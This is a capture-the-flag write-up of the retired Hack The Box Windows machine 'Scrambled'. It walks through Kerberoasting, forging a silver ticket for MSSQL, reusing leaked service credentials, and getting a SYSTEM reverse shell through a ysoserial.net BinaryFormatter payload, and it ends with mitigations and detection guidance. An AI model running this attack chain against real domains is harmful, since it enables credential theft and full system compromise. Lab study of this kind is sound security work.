---
machine: Scrambled
os: Windows
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, kerberos, silver-ticket, deserialization]
---

# Scrambled — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable note.
> Reference note based on public documentation and technical writeups. No real flags, credentials or hashes.

## TL;DR

Scramble Corp's intranet leaks `ksimpson`'s name and a helpdesk policy that resets passwords to the username. NTLM is disabled, so all authentication goes through Kerberos. A PDF on the `Public` share points to MSSQL; `sqlsvc` has an SPN and can be Kerberoasted. Its hash allows forging a **silver ticket** for `MSSQLSvc/dc1.scrm.local:1433` and impersonating `Administrator`. The database exposes `MiscSvc`'s credential; that account reaches the `IT` share and `ScrambleClient.exe`/`ScrambleLib.dll`. The client uses `BinaryFormatter` on port 4411, enabling .NET deserialization up to SYSTEM.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
53/tcp    domain
80/tcp    http       Microsoft IIS 10.0
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   http-rpc-epmap
636/tcp   ldapssl
1433/tcp  ms-sql-s   SQL Server 2019
4411/tcp  unknown    SCRAMBLECORP_ORDERS_V1.0.3
5985/tcp  wsman
9389/tcp  adws
```

Domain `scrm.local`, DC `dc1.scrm.local`. Port 4411 returns a custom version string; note it for later.

## Enumeration

The site is an intranet with support and new-user pages. A helpdesk console screenshot reveals `ksimpson`; the procedure says the password is reset to the username. Try the credential and authenticate over Kerberos:

```bash
smbclient.py -k scrm.local/ksimpson:<PASSWORD>@dc1.scrm.local -dc-ip dc1.scrm.local
```

```text
ADMIN$  C$  HR  IPC$  IT  NETLOGON  Public  Sales  SYSVOL
```

`Public` contains a PDF mentioning a SQL database and leaked credentials. `IT` is not accessible yet.

## Foothold

With a valid TGT, enumerate SPNs:

```bash
GetUserSPNs.py -k -no-pass -dc-host dc1.scrm.local scrm.local/ksimpson -request
```

`sqlsvc` has `MSSQLSvc/dc1.scrm.local:1433`. Request the TGS and crack it:

```bash
hashcat -m 13100 sqlsvc.txt /usr/share/wordlists/rockyou.txt
```

`sqlsvc`'s password does not grant direct MSSQL access because the account is in a `NOACCESS` group. The path is to forge a silver ticket signed with its hash, using the service SPN and the domain SID:

```bash
ticketer.py -nthash <SQLSVC_NTHASH> \
  -domain-sid S-1-5-21-<DOMAIN_SID> -domain scrm.local \
  -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
```

```bash
KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
```

MSSQL trusts the ticket because it is signed with `sqlsvc`'s key; the DC is not involved.

## Lateral movement

Query the HR import table in MSSQL:

```sql
SELECT * FROM ScrambleHR.dbo.UserImport;
```

The table holds `MiscSvc`'s username and password. Use that account over WinRM and read the `IT` share:

```bash
evil-winrm -i dc1.scrm.local -u MiscSvc -p '<PASSWORD>'
```

```powershell
ls C:\shares\IT\Apps\'Sales Order Client'
# ScrambleClient.exe  ScrambleLib.dll
```

## Privilege escalation

Download the executable and DLL and analyse them with dnSpy/ILSpy. The client talks to port 4411 using this protocol:

```text
SCRAMBLECORP_ORDERS_V1.0.3;
LIST_ORDERS
UPLOAD_ORDER;<BinaryFormatter payload>
```

`ScrambleLib` deserializes the `UPLOAD_ORDER` body with `BinaryFormatter`, without checking the type. Generate a `ysoserial.net` payload to run a command and send it to port 4411:

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -o base64 -c 'powershell -e <BASE64_REVERSE_SHELL>'
```

```text
UPLOAD_ORDER;<BASE64_PAYLOAD>
```

The service runs as SYSTEM and executes the chain. The resulting shell is `nt authority\system`.

## Evidence

- Helpdesk page with the username and password policy, no real data.
- `sqlsvc` SPN and TGS request.
- `UserImport` query with the password redacted.
- Port 4411 version string and `whoami` as SYSTEM.

## Lessons learned

- With NTLM disabled, tooling must use Kerberos and a valid ccache.
- A silver ticket does not require compromising the DC: the service hash and SPN are enough.
- `BinaryFormatter` is dangerous even in a proprietary protocol; the payload type is not validated.
- An HR import table can hold reusable service credentials.

## Mitigations and detection

- **Fix:** remove `BinaryFormatter` and use a serializer with allowed types; rotate service passwords; never store credentials in business tables; limit MSSQL exposure; review `NOACCESS` groups and ACLs.
- **Detection:** bulk TGS requests (4769) for service accounts; silver tickets with anomalous validity periods; access to `UserImport`; connections to 4411 carrying `BinaryFormatter` chains; child processes of `ScrambleClient.exe`.
- MITRE ATT&CK: T1558.003 (Kerberoasting), T1558.002 (silver ticket), T1059.001 (PowerShell), T1219 (remote access software).

## References

- <https://www.hackthebox.com/machines/Scrambled>
- <https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html>
- <https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide>
- <https://attack.mitre.org/techniques/T1558/002/>
